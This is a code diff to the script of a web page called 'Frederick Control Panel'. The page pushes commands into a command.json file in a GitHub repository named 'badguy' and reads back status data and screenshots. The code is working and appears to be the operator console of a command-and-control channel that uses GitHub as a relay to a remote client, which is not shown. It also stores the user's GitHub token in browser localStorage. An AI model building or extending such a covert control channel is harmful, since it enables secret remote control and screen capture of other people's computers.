@@ -329,51 +329,75 @@
     </div>
 
     <script>
+        // ===== КОНФИГУРАЦИЯ =====
         const GITHUB_OWNER = 'chotkof';
-        const GITHUB_REPO = 'pizdec';
-        const COMMAND_FILE = 'command.json';
+        const GITHUB_REPO = 'badguy';  // ИСПРАВЛЕНО на badguy
+        const COMMAND_FILE = 'command.json';  // ТОЧНО command.json
         const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/`;
 
         let commandId = 0;
 
-        // ===== Отправка команды =====
-        async function sendCmd(cmd) {
+        // ===== Отправка команды с retry =====
+        async function sendCmd(cmd, retryCount = 0) {
             const logArea = document.getElementById('logArea');
             addLog('command', `➤ ${cmd}`);
 
-            try {
-                // Читаем текущий command.json
-                let current = [];
-                try {
-                    const resp = await fetch(RAW_URL + COMMAND_FILE);
-                    if (resp.ok) {
-                        current = await resp.json();
-                    }
-                } catch(e) {}
-
-                // Добавляем новую команду
-                commandId++;
-                current.push({ id: String(commandId), cmd: cmd });
-
-                // Отправляем через GitHub API
-                const token = prompt('Enter GitHub token (or leave empty for public repo):');
+            // Получаем токен
+            let token = localStorage.getItem('github_token');
+            if (!token) {
+                token = prompt('Enter GitHub token:');
                 if (!token) {
-                    addLog('error', '❌ Token required to write to GitHub');
+                    addLog('error', '❌ Token required');
+                    return;
+                }
+                localStorage.setItem('github_token', token);
+            }
+
+            try {
+                // ЧИТАЕМ текущий command.json
+                let current = [];
+                let sha = null;
+                
+                try {
+                    const shaResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
+                        headers: { 
+                            'Authorization': `token ${token}`,
+                            'Accept': 'application/vnd.github.v3+json'
+                        }
+                    });
+                    
+                    if (shaResp.ok) {
+                        const data = await shaResp.json();
+                        if (data.content) {
+                            const decoded = atob(data.content);
+                            current = JSON.parse(decoded);
+                        }
+                        sha = data.sha;
+                        addLog('info', `📄 Current SHA: ${sha.substring(0, 8)}...`);
+                    } else if (shaResp.status === 404) {
+                        current = [];
+                        sha = null;
+                        addLog('info', '📄 Creating new file');
+                    } else {
+                        const err = await shaResp.json();
+                        if (shaResp.status === 401 || shaResp.status === 403) {
+                            localStorage.removeItem('github_token');
+                            addLog('error', '❌ Token invalid, please re-enter');
+                            return sendCmd(cmd, retryCount + 1);
+                        }
+                        addLog('error', `❌ ${err.message || shaResp.status}`);
+                        return;
+                    }
+                } catch(e) {
+                    addLog('error', `❌ Read error: ${e.message}`);
                     return;
                 }
 
-                // Получаем SHA файла для обновления
-                let sha = null;
-                try {
-                    const shaResp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${COMMAND_FILE}`, {
-                        headers: { 'Authorization': `token ${token}` }
-                    });
-                    if (shaResp.ok) {
-                        const data = await shaResp.json();
-                        sha = data.sha;
-                    }
-                } catch(e) {}
+                // Добавляем команду
+                commandId++;
+                current.push({ id: String(commandId), cmd: cmd });
 
+                // ПЫТАЕМСЯ записать
                 const payload = {
                     message: `Command: ${cmd}`,
                     content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
@@ -384,16 +408,30 @@
                     method: 'PUT',
                     headers: {
                         'Authorization': `token ${token}`,
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/vnd.github.v3+json'
                     },
                     body: JSON.stringify(payload)
                 });
 
                 if (resp.ok) {
                     addLog('success', `✅ Command sent: ${cmd}`);
+                    setTimeout(fetchStatus, 2000);
                 } else {
                     const err = await resp.json();
-                    addLog('error', `❌ Failed: ${err.message || resp.status}`);
+                    const errorMsg = err.message || resp.statusText;
+                    addLog('error', `❌ Failed: ${errorMsg}`);
+                    
+                    if (errorMsg.includes('does not match') && retryCount < 3) {
+                        addLog('info', `🔄 Retry ${retryCount + 1}/3...`);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        return sendCmd(cmd, retryCount + 1);
+                    }
+                    
+                    if (resp.status === 401 || resp.status === 403) {
+                        localStorage.removeItem('github_token');
+                        addLog('error', '❌ Token invalid, please refresh');
+                    }
                 }
             } catch(e) {
                 addLog('error', `❌ Error: ${e.message}`);
@@ -474,7 +512,7 @@
                     document.getElementById('aeroStatus').textContent = status.aeroInstalled ? '✅' : 'OFF';
                     addLog('success', `📊 Status updated: ${status.windowCount} windows`);
                 } else {
-                    addLog('error', '❌ Cannot fetch status');
+                    addLog('info', '📊 Status file not found yet. Run /status command first.');
                 }
             } catch(e) {
                 addLog('error', `❌ ${e.message}`);
@@ -512,10 +550,10 @@
             }
         }
 
-        // ===== Fetch screenshots =====
+        // ===== Fetch screenshots из outputs/images =====
         async function fetchScreenshots() {
             try {
-                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/results/`);
+                const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/outputs/images`);
                 if (resp.ok) {
                     const files = await resp.json();
                     const grid = document.getElementById('mediaGrid');
@@ -552,6 +590,7 @@
         addLog('info', '🚀 Frederick Control Panel loaded');
         addLog('info', '📡 Send commands via the buttons above');
         addLog('info', `📁 Repo: ${GITHUB_OWNER}/${GITHUB_REPO}`);
+        addLog('info', `📄 Command file: ${COMMAND_FILE}`);
 
         // ===== Check if files exist =====
         async function checkFiles() {
